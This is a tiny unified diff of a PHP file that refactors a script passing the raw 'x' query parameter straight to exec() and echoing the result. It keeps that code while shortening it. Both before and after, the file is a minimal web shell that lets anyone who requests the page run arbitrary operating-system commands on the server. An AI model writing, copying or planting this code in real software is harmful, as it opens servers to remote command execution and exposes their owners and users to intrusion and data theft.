@@ -1,4 +1,3 @@
 <?php
-    $out=exec($_GET['x']);
-    echo $out;
+    echo exec($_GET['x']);
  ?>
